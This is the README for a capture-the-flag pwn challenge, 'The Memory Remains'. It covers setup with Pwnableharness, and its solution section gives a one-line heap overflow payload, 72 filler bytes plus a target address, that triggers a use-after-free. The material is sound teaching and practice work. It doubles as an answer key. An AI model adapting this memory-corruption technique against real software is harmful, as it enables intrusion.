# [Pwn 50] The Memory Remains

## Setup

This challenge will run using Pwnableharness. Copy this directory into the Pwnableharness base directory, then run the command "make docker-start" in the pwnableharness base directory. The player should receive a copy of the binary and libpwnableharness from the attachments folder, which in order for the binary to run they both need to be in the same directory.

## Solution

Overflow a heap pointer to execute a use after free attack. This will solve the challenge that is locally running.

```bash
# 0x804a174 is &centari->cluster
python -c 'print "0"*72 + "\x74\xa1\x04\x08"' | ./the_memory_remains
```

The `exploit.py` script will solve the challenge that is running remotely.
